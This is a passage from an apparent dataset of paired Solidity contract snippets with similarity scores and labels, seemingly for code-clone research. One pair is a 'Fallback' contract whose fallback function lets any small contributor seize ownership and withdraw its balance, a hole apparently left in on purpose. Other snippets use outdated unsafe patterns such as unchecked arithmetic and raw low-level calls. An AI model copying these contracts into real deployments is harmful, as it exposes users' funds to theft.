    returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 
    _value);
    event Approval(address indexed _owner, address indexed _spender, 
    uint256 _value);
    event FrozenFunds(address target, bool frozen);
    event Burn(address indexed from, uint256 value);
}",0.928011685,"contract Token {
    

    
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
    function burn(uint num) public;

    
    function transfer(address _to, uint256 _value, bytes _data) public returns (bool success);

    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed _burner, uint _value);

    
}",2,,,,,
"contract SimpleStorage {
    uint storeddata;
    function set(uint x) public {
        storeddata = x;
    }
    function get() public view returns(uint) {
        return storeddata;
    }
}",0.929775198,"contract SimpleStorage

{

    uint storedData;

    

    function set(uint x) public

    {

        storedData = x;

    }



    function get() public view returns (uint)

    {

        return storedData;

    }

}",1,,,,,
"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;
  }

  
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }

}",0.985102698,"contract BasicToken is ERC20Basic {
    using SafeMath for uint256;

    mapping(address => uint256) balances;

    
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);

        
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

}",1,,,,,
"contract Crowdsale {
  using SafeMath for uint256;

   
  TOKKA public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  uint256 public CAP = 3000000000000000000;

  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));

    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
    token = createTokenContract();
  }



function createTokenContract() internal returns (TOKKA) {
    return new TOKKA();
  }


  
  function () external payable {
    buyTokens(msg.sender);
  }

  
function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    
    
    
    StandardToken(token).transfer(beneficiary, tokens);

    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
}


  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }


  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }


  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

  function GoalReached() public view returns (bool) {
    return (weiRaised >= CAP);
  }

}",0.916874971,"contract Crowdsale {
  using SafeMath for uint256;

  
  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 tokens);

  
  MintableToken public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  uint256 public rate;

  
  address public wallet;

  
  uint256 public weiRaised;
  
  uint256 public tokensSold;


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet, address _token) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));
    require(_token != address(0));

    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
    token = MintableToken(_token);
  }

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);
    tokensSold = tokensSold.add(tokens);

    token.mint(beneficiary, tokens);
    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
  }

  
  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

  
  function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
    return weiAmount.mul(rate);
  }

  
  
  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }

  
  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }

}",3,,,,,
"contract Forwarder {
> 
>   address public destinationAddress;   event LogForwarded(address
> indexed sender, uint amount);   event LogFlushed(address indexed
> sender, uint amount);
> 
>   function Forwarder() public {
>     destinationAddress = msg.sender;   }
> 
>   function() payable public {
>     emit LogForwarded(msg.sender, msg.value);
>     destinationAddress.transfer(msg.value);   }
> 
>   function flush() public {
>     emit LogFlushed(msg.sender, address(this).balance);
>     destinationAddress.transfer(address(this).balance);   }
> 
> }",0.976142998,"contract Forward {

  address public destinationAddress;
  event LogForwarded(address indexed sender, uint amount);
  event LogFlushed(address indexed sender, uint amount);

  function constuctor() public {
    destinationAddress = msg.sender;
  }

  function() payable public {
    emit LogForwarded(msg.sender, msg.value);
    destinationAddress.transfer(msg.value);
  }

  function flush() public {
    emit LogFlushed(msg.sender, address(this).balance);
    destinationAddress.transfer(address(this).balance);
  }

}",1,,,,,
"contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function Ownable() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        require(newOwner != address(0));
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}",0.963315619,"contract Ownable {

  address public owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  

  constructor() public{

    owner = msg.sender;

  }

  

  modifier onlyOwner() {

    require(msg.sender == owner);

    _;

  }

  

  function transferOwnership(address newOwner) onlyOwner public {

    require(newOwner != address(0));

    emit OwnershipTransferred(owner, newOwner);

    owner = newOwner;

  }

}",1,,,,,
"contract FLOCK is StandardToken { 
    using SafeMath for uint;

    

    
    string public version = ""H1.0""; 
    uint256 public totalEthInWei;         
    address public fundsWallet;           

    Round[] rounds;
    struct Round {
        uint start;
        uint end;
        uint price;
    }

    
    
    function FLOCK() public {
        totalSupply = 10000000000;          
        balances[msg.sender] = totalSupply; 
        name = ""FLOCK"";                     
        decimals = 0;                       
        symbol = ""FLK"";                     
        fundsWallet = msg.sender;           

        uint ts = 1523923200;
        rounds.push(Round(ts, ts += 1 days, 500000)); 
        rounds.push(Round(ts, ts += 1 days, 500000)); 
        rounds.push(Round(ts, ts += 1 days, 250000)); 
        rounds.push(Round(ts, ts += 1 days, 166667)); 
        rounds.push(Round(ts, ts += 1 days, 125000)); 
        rounds.push(Round(ts, ts += 1 days, 100000)); 
        rounds.push(Round(ts, ts += 1 days, 83333)); 
        rounds.push(Round(ts, ts += 1 days, 71429)); 
        rounds.push(Round(ts, ts += 1 days, 62500)); 
        rounds.push(Round(ts, ts += 1 days, 55556)); 
        rounds.push(Round(ts, ts += 1 days, 50000)); 
    }

    
    
    function unitsOneEthCanBuy() public view returns (uint _units) {
        for (uint i = 0; i < rounds.length; i++) {
            Round memory round = rounds[i];
            if (block.timestamp >= round.start && block.timestamp < round.end) {
                return round.price;
            }
        }
        return 0;
    }

    
    
    function() external payable {
        uint ethInWei = msg.value;
        totalEthInWei = totalEthInWei + ethInWei;
        uint perEth = unitsOneEthCanBuy();

        
        
        uint256 amount = ethInWei.mul(perEth).div(10**uint(18 - decimals));

        require(amount > 0);
        require(balances[fundsWallet] >= amount);

        
        fundsWallet.transfer(msg.value);                               

        bytes memory empty;
        processTransfer(fundsWallet, msg.sender, amount, empty);
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _data) external returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        
        iApprover(_spender).receiveApproval(msg.sender, _value, address(this), _data);
        return true;
    }

    
    function reclaimERC20(address _token, uint _tokens) external returns (bool _success) {
        require(msg.sender == fundsWallet);
        return Token(_token).transfer(msg.sender, _tokens);
    }
}",0.985193022,"contract FLOCK is StandardToken { 

    using SafeMath for uint;



    



    

    string public version = ""H1.0""; 

    uint256 public totalEthInWei;         

    address public fundsWallet;           



    Round[] rounds;

    struct Round {

        uint start;

        uint end;

        uint price;

    }



    

    

    function FLOCK() public {

        totalSupply = 10000000000;          

        balances[msg.sender] = totalSupply; 

        name = ""FLOCK"";                     

        decimals = 0;                       

        symbol = ""FLK"";                     

        fundsWallet = msg.sender;           



        uint ts = 1523764800;

        rounds.push(Round(ts, ts += 5 days, 500000)); 

        rounds.push(Round(ts, ts += 5 days, 500000)); 

        rounds.push(Round(ts, ts += 2 days, 250000)); 

        rounds.push(Round(ts, ts += 2 days, 166667)); 

        rounds.push(Round(ts, ts += 2 days, 125000)); 

        rounds.push(Round(ts, ts += 2 days, 100000)); 

        rounds.push(Round(ts, ts += 2 days, 83333)); 

        rounds.push(Round(ts, ts += 2 days, 71429)); 

        rounds.push(Round(ts, ts += 2 days, 62500)); 

        rounds.push(Round(ts, ts += 2 days, 55556)); 

        rounds.push(Round(ts, ts += 2 days, 50000)); 

    }



    

    

    function unitsOneEthCanBuy() public view returns (uint _units) {

        for (uint i = 0; i < rounds.length; i++) {

            Round memory round = rounds[i];

            if (block.timestamp >= round.start && block.timestamp < round.end) {

                return round.price;

            }

        }

        return 0;

    }



    

    

    function() external payable {

        uint ethInWei = msg.value;

        totalEthInWei = totalEthInWei + ethInWei;

        uint perEth = unitsOneEthCanBuy();

        

        

        

        uint256 amount = ethInWei.mul(perEth).div(10**uint(18 - decimals));



        require(amount > 0);

        require(balances[fundsWallet] >= amount);



        

        fundsWallet.transfer(msg.value);                               



        bytes memory empty;

        processTransfer(fundsWallet, msg.sender, amount, empty);

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _data) external returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);



        

        iApprover(_spender).receiveApproval(msg.sender, _value, address(this), _data);

        return true;

    }



    

    function reclaimERC20(address _token, uint _tokens) external returns (bool _success) {

        require(msg.sender == fundsWallet);

        return Token(_token).transfer(msg.sender, _tokens);

    }

}",1,,,,,
"contract SimpleToken is StandardToken {

  string public constant name = ""SimpleToken""; 
  string public constant symbol = ""SIM""; 
  uint8 public constant decimals = 18; 

  uint256 public constant INITIAL_SUPPLY = 10000 * (10 ** uint256(decimals));

  
  function SimpleToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }

}",0.961115419,"contract SimpleToken is StandardToken {

  string public constant name = ""CEEK""; 
  string public constant symbol = ""CEEK""; 
  uint8 public constant decimals = 18; 

  uint256 public constant INITIAL_SUPPLY = 1000000000 * (10 ** uint256(decimals));

  
  function SimpleToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }

}",1,,,,,
"contract Owned {
    address public owner;

    function Owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}",0.98011761,"contract owned {
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}",0,,,,,
"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply; 
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }


    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }


    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }
}",0.907104865,"contract token {

    

    string public name;

    string public symbol;

    uint8 public decimals;

    uint256 public totalSupply;



    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);



    

    constructor(

        uint256 initialSupply,

        string tokenName,

        uint8 decimalUnits,

        string tokenSymbol

        ) public {

        balanceOf[msg.sender] = initialSupply;              

        totalSupply = initialSupply;                        

        name = tokenName;                                   

        symbol = tokenSymbol;                               

        decimals = decimalUnits;                            

    }



    

    function transfer(address _to, uint256 _value) public returns (bool success) {

        if (balanceOf[msg.sender] < _value) revert();           

        if (balanceOf[_to] + _value < balanceOf[_to]) revert(); 

        balanceOf[msg.sender] -= _value;                     

        balanceOf[_to] += _value;                            

        emit Transfer(msg.sender, _to, _value);                   

        return true;

    }



    

    function approve(address _spender, uint256 _value) public

        returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        return true;

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public 

        returns (bool success) {    

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, this, _extraData);

            return true;

        }

    }



    

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        if (balanceOf[_from] < _value) revert();                 

        if (balanceOf[_to] + _value < balanceOf[_to]) revert();  

        if (_value > allowance[_from][msg.sender]) revert();   

        balanceOf[_from] -= _value;                          

        balanceOf[_to] += _value;                            

        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, _value);

        return true;

    }



    

    function () public {

        revert();     

    }

}",1,,,,,
"contract CCTCOIN {

string public name;
string public symbol;
uint8 public decimals = 8;
uint256 public totalSupply;

mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) public allowance;


event Transfer(address indexed from, address indexed to, uint256 value);


event Burn(address indexed from, uint256 value);

constructor(

) public {
    totalSupply = 21000000 * 10 ** uint256(decimals);  
    balanceOf[msg.sender] = totalSupply;               
    name = ""CCTCOIN"";                                  
    symbol = ""CCTC"";                               
}


function _transfer(address _from, address _to, uint _value) internal {

    require(_to != 0x0);
    require(balanceOf[_from] >= _value);
    require(balanceOf[_to] + _value >= balanceOf[_to]);
    uint previousBalances = balanceOf[_from] + balanceOf[_to];
    balanceOf[_from] -= _value;
    balanceOf[_to] += _value;
    emit Transfer(_from, _to, _value);
    assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
}


function transfer(address _to, uint256 _value) public {
    _transfer(msg.sender, _to, _value);
}


function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= allowance[_from][msg.sender]);  
    allowance[_from][msg.sender] -= _value;
    _transfer(_from, _to, _value);
    return true;
}


function approve(address _spender, uint256 _value) public
    returns (bool success) {
    allowance[msg.sender][_spender] = _value;
    return true;
}


function approveAndCall(address _spender, uint256 _value, bytes _extraData)
    public
    returns (bool success) {
    tokenRecipient spender = tokenRecipient(_spender);
    if (approve(_spender, _value)) {
        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }
}

function burn(uint256 _value) public returns (bool success) {
    require(balanceOf[msg.sender] >= _value);   
    balanceOf[msg.sender] -= _value;          
    totalSupply -= _value;                      
    emit Burn(msg.sender, _value);
    return true;
}


function burnFrom(address _from, uint256 _value) public returns (bool success) {
    require(balanceOf[_from] >= _value);                
    require(_value <= allowance[_from][msg.sender]);    
    balanceOf[_from] -= _value;                         
    allowance[_from][msg.sender] -= _value;             
    totalSupply -= _value;                              
    emit Burn(_from, _value);
    return true;
}
}",0.976602994,"contract TokenERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 8;
    uint256 public totalSupply;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Burn(address indexed from, uint256 value);

    
    function TokenERC20() public {
        totalSupply = 300000000 * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = 'BitPaction Shares';
        symbol = 'BPS';
    }

   
    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                     
        Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value; 
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",1,,,,,
"contract ERC20Interface {
  
  function transfer(address _to, uint256 _value) public returns (bool success);
  
  function balanceOf(address _owner) public constant returns (uint256 balance);
}",0.931008697,"contract token {



  function balanceOf(address _owner) public constant returns (uint256 balance);

  function transfer(address _to, uint256 _value) public returns (bool success);



}",0,,,,,
"contract raman {
    address owner;
    
    function raman() { owner = msg.sender; }
    function kill() { if (msg.sender == owner) selfdestruct(owner);}
}",0.908321984,"contract Mortal {
    
    address owner;

    
    function Mortal() { owner = msg.sender; }

    
    function kill() { if (msg.sender == owner) selfdestruct(owner); }
}",0,,,,,
"contract greeter is raman {
    
    string greeting;

    
    function greeter(string _greeting) public { greeting = _greeting; }

    
    function greet() constant returns (string) { return greeting; }
}",0.942708708,"contract Greeter is Mortal {
    
    string greeting;

    
    function Greeter(string _greeting) public {
        greeting = _greeting;
    }

    
    function greet() constant returns (string) {
        return greeting;
    }
}",1,,,,,
"contract Ownable {

address public owner;

function Ownable() public {
    owner = msg.sender;
}

modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

function transferOwnership(address newOwner) public onlyOwner {
    owner = newOwner;
}

}",0.941270682,"contract owned {
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) onlyOwner public {
        owner = newOwner;
    }
}",1,,,,,
"contract SimpleTokenCoin is Ownable {

string public constant name = ""Vozik coin"";

string public constant symbol = ""VZC"";

uint32 public constant decimals = 18;

uint public totalSupply = 1000000;

mapping (address => uint) balances;

mapping (address => mapping(address => uint)) allowed;

function mint(address _to, uint _value) public onlyOwner {
    assert(totalSupply + _value >= totalSupply && balances[_to] + _value >= balances[_to]);
    balances[_to] += _value;
    totalSupply += _value;
}

function balanceOf(address _owner) public constant returns (uint balance) {
    return balances[_owner];
}

function transfer(address _to, uint _value) public returns (bool success) {
    if(balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {
        balances[msg.sender] -= _value; 
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    } 
    return false;
}

function transferFrom(address _from, address _to, uint _value) public returns (bool success) {
    if( allowed[_from][msg.sender] >= _value &&
        balances[_from] >= _value 
        && balances[_to] + _value >= balances[_to]) {
        allowed[_from][msg.sender] -= _value;
        balances[_from] -= _value; 
        balances[_to] += _value;
        Transfer(_from, _to, _value);
        return true;
    } 
    return false;
}

function approve(address _spender, uint _value) public returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
}

function allowance(address _owner, address _spender) public constant returns (uint remaining) {
    return allowed[_owner][_spender];
}

event Transfer(address indexed _from, address indexed _to, uint _value);

event Approval(address indexed _owner, address indexed _spender, uint _value);

}",0.974925402,"contract ValeaCdsTok20220305I is Ownable {
    
    string public constant name = ""ValeaCdsTok20220305I"";
    
    string public constant symbol = ""VALEAI"";
    
    uint32 public constant decimals = 8;
    
    uint public totalSupply = 0;
    
    mapping (address => uint) balances;
    
    mapping (address => mapping(address => uint)) allowed;
    
    function mint(address _to, uint _value) public onlyOwner {
        assert(totalSupply + _value >= totalSupply && balances[_to] + _value >= balances[_to]);
        balances[_to] += _value;
        totalSupply += _value;
    }
    
    function balanceOf(address _owner) public constant returns (uint balance) {
        return balances[_owner];
    }

    function transfer(address _to, uint _value) public returns (bool success) {
        if(balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {
            balances[msg.sender] -= _value; 
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } 
        return false;
    }
    
    function transferFrom(address _from, address _to, uint _value) public returns (bool success) {
        if( allowed[_from][msg.sender] >= _value &&
            balances[_from] >= _value 
            && balances[_to] + _value >= balances[_to]) {
            allowed[_from][msg.sender] -= _value;
            balances[_from] -= _value; 
            balances[_to] += _value;
            Transfer(_from, _to, _value);
            return true;
        } 
        return false;
    }
    
    function approve(address _spender, uint _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) public constant returns (uint remaining) {
        return allowed[_owner][_spender];
    }
    
    event Transfer(address indexed _from, address indexed _to, uint _value);
    
    event Approval(address indexed _owner, address indexed _spender, uint _value);
    
}",1,,,,,
"contract MyToken {

    string public name;
    string public symbol;
    uint8 public decimals;

    mapping (address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function transfer(address _to, uint256 _value) public {
        require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
    }   

   constructor(uint256 initialSupply, string memory tokenName, string memory tokenSymbol, uint8 decimalUnits) public {
        balanceOf[msg.sender] = initialSupply;              
        name = tokenName;                                   
        symbol = tokenSymbol;                               
        decimals = decimalUnits; 

    }

}",0.951812083,"contract NetkillerToken {
  string public name;
  string public symbol;
  uint public decimals;

  event Transfer(address indexed from, address indexed to, uint256 value);

  
  mapping (address => uint256) public balanceOf;

  function NetkillerToken(uint256 initialSupply, string tokenName, string tokenSymbol, uint decimalUnits) public {
    balanceOf[msg.sender] = initialSupply;
    name = tokenName;
    symbol = tokenSymbol;
    decimals = decimalUnits;
  }

  
  function transfer(address _to, uint256 _value) public {
    
    require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);

    
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;

    
    emit Transfer(msg.sender, _to, _value);
  }
}",1,,,,,
"contract Fallback is Ownable {

  mapping(address => uint) public contributions;

  function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(this.balance);
  }

  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}",0.98337808,"contract Fallback is Ownable {



	  mapping(address => uint) public contributions;



	  function fallback() public {

      contributions[msg.sender] = 1000 * (1 ether);

      }



	  function contribute() public payable {

        require(msg.value < 0.001 ether);

        contributions[msg.sender] += msg.value;

		  if(contributions[msg.sender] > contributions[owner]) {

          owner = msg.sender;

		  }

	  }



	  function getContribution() public view returns (uint) {

        return contributions[msg.sender];

      }



	  function withdraw() public onlyOwner {

        owner.transfer(address(this).balance);

      }



	  function() payable public {

		require(msg.value > 0 && contributions[msg.sender] > 0);

		owner = msg.sender;

	  }

	}",1,,,,,
"contract Tyaw is StandardToken { 

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0'; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           

    
    
    function Tyaw() {
        balances[msg.sender] = 12000000000000000000000000;               
        totalSupply = 12000000000000000000000000;                        
        name = ""Tyaw"";                                   
        decimals = 18;                                               
        symbol = ""TWQ"";                                             
        unitsOneEthCanBuy = 1000;                                      
        fundsWallet = msg.sender;                                    
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        if (balances[fundsWallet] < amount) {
            return;
        }

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",0.965593938,"contract CR7 is StandardToken { 



    



    

    string public name;                   

    uint8 public decimals;                

    string public symbol;                 

    string public version = 'H1.0'; 

    uint256 public unitsOneEthCanBuy;     

    uint256 public totalEthInWei;         

    address public fundsWallet;           



    

    

    function CR7() {

        balances[msg.sender] = 1000000000000000000000000;               

        totalSupply = 1000000000000000000000000;                        

        name = ""CR7_TokenCoin"";                                       

        decimals = 18;                                               

        symbol = ""CR7"";                                             

        unitsOneEthCanBuy = 10;                                      

        fundsWallet = msg.sender;                                    

    }



    function() payable{

        totalEthInWei = totalEthInWei + msg.value;

        uint256 amount = msg.value * unitsOneEthCanBuy;

        require(balances[fundsWallet] >= amount);



        balances[fundsWallet] = balances[fundsWallet] - amount;

        balances[msg.sender] = balances[msg.sender] + amount;



        Transfer(fundsWallet, msg.sender, amount); 



        

        fundsWallet.transfer(msg.value);                               

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        

        

        

        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }

        return true;

    }

}",1,,,,,
"contract BasicToken is ERC20Basic {
            using SafeMath for uint;

            mapping(address => uint) balances;

            modifier onlyPayloadSize(uint size) {
               if(msg.data.length < size + 4) {
                  throw;
                }
                _;
             }

          function transfer(address _to, uint _value) onlyPayloadSize(2 * 32){
            require(_to != address(0)); 
            balances[msg.sender] = balances[msg.sender].sub(_value);
            balances[_to] = balances[_to].add(_value);
            Transfer(msg.sender, _to, _value);
           }
          function balanceOf(address _owner) constant returns (uint balance) {
             return balances[_owner];
            }

           }",0.944749205,"contract BasicToken is ERC20Basic {

    using SafeMath for uint;



    mapping(address => uint) balances;



    

    modifier onlyPayloadSize(uint size) {

        require (size + 4 <= msg.data.length);

        _;

    }



    

    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {

        balances[msg.sender] = balances[msg.sender].sub(_value);

        balances[_to] = balances[_to].add(_value);

        emit Transfer(msg.sender, _to, _value);

    }



    

    function balanceOf(address _owner) view public returns (uint balance) {

        return balances[_owner];

    }



}",2,*,,,,
"contract TestToken is StandardToken {

           string public name = ""TestToken"";
           string public symbol = ""TT"";
           uint public decimals = 15;
           uint public INITIAL_SUPPLY = 100000000000000000000000; 

           function TestToken() {
